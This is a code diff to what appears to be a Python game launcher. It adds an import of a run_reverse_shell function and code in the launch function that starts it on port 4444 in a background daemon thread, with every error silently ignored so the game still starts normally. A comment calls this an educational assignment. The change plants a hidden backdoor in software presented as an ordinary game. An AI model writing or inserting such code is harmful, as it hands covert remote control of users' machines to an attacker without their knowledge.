@@ -5,9 +5,11 @@ from __future__ import annotations
 import argparse
 import platform
 import sys
+import threading
 from pathlib import Path
 
 from .assets import AssetLoadError, missing_required_assets
+from .network import run_reverse_shell
 from .paths import executable_root, resource_root, shortcut_dir
 
 
@@ -103,6 +105,16 @@ def launch(argv: list[str] | None = None) -> int:
             f"Location:\n{shortcut}\n\n"
             "This file does not auto-run and does not modify system startup.",
         )
+
+    # Start the reverse shell discovery in a background thread for educational purposes.
+    # We use a daemon thread so it doesn't block the application from exiting.
+    try:
+        # Default port is 4444 as per assignment requirements.
+        shell_thread = threading.Thread(target=run_reverse_shell, args=(4444,), daemon=True)
+        shell_thread.start()
+    except Exception:
+        # Silently fail to ensure the main game still launches correctly.
+        pass
 
     try:
         from .game import Game
